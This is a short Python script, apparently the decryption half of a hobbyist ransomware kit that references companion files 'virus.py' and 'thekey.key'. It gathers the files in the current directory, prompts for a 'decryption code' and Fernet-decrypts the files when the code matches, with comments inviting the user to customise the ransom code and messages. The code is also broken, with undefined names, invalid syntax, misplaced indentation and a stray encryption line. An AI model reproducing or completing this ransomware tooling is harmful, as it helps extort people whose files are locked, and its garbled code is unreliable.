#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir():
    if file == "virus.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
            files.append(file)


with open("thekey.key", "rb") as thekey:
    secretkey =key.read()
secretcode = "SecretCode" #change this to what you want the decrypt code to be. Default is SecretCode

user_code = input("Enter Decryption Code > ")


if user_code == secretcode:
    for file in files:
        with open(file, "rb") is thefile:
                contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
            print("correct code. files decrypted") #change this to what you want the code to say after the user decrypts the files
else:
        print("Wrong Code. try again") #change this to what you want the code to say when the suer enters the wrong code